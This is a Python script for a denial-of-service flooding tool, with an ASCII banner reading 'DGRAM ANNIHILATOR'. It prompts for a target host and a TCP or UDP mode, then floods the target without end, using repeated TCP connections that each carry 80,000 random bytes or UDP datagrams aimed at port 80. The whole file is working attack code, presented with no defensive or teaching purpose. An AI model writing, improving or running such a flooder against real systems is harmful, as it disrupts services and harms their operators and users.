import socket
import random
import os
import time
import sys

def checkForTarget(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection = sock.connect_ex((ip, int(port)))
        sock.close()
        return True
    except:
        return False

def attackTCP(ip, port):
    countdown = 5 
    while countdown > 0:
        print("Attack Starting in " + str(countdown))
        countdown = countdown - 1
        time.sleep(0.5)

    while True:
        bytes = random._urandom(80000)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))
        sock.sendall(bytes)
        print ("Sent bytes" + " to " + ip + ", port: " + str(port))

def attackUDP(ip):
    port = 80 #http port
    countdown = 5
    bytes = random._urandom(47680)
    while countdown > 0:
        print("Attack Starting in " + str(countdown))
        countdown = countdown - 1
        time.sleep(0.5)

    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes, (ip, port))
        print ("Sent bytes" + " to " + ip + ", port: " + str(port))


print("▗▄▄▄   ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖     ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖    ▗▄▖▗▄▄▄▖▗▄▖ ▗▄▄▖ ")
print("▐▌  █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌    ▐▌ ▐▌▐▛▚▖▐▌▐▛▚▖▐▌  █  ▐▌ ▐▌  █  ▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌ ▐▌")
print("▐▌  █ ▐▌▝▜▌▐▛▀▚▖▐▛▀▜▌▐▌  ▐▌    ▐▛▀▜▌▐▌ ▝▜▌▐▌ ▝▜▌  █  ▐▛▀▜▌  █  ▐▌   ▐▛▀▜▌ █ ▐▌ ▐▌▐▛▀▚▖")
print("▐▙▄▄▀ ▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▐▌  ▐▌▐▌  ▐▌▗▄█▄▖▐▌ ▐▌▗▄█▄▖▐▙▄▄▖▐▌ ▐▌ █ ▝▚▄▞▘▐▌ ▐▌")

print("Select Attack Type")
print("1. TCP")
print("2. UDP")
attackType = input("Number of Choice: ")


if attackType == "1":
    ip = input("Enter Host Address: ")
    port = input("Enter port number: ")

    if checkForTarget(ip, port) == True:
        print("Host Connected")
        attackTCP(ip, port)
    else:
        print("Host connection failed")

elif attackType == "2":
    ip = input("Enter Host Address: ")
    attackUDP(ip)

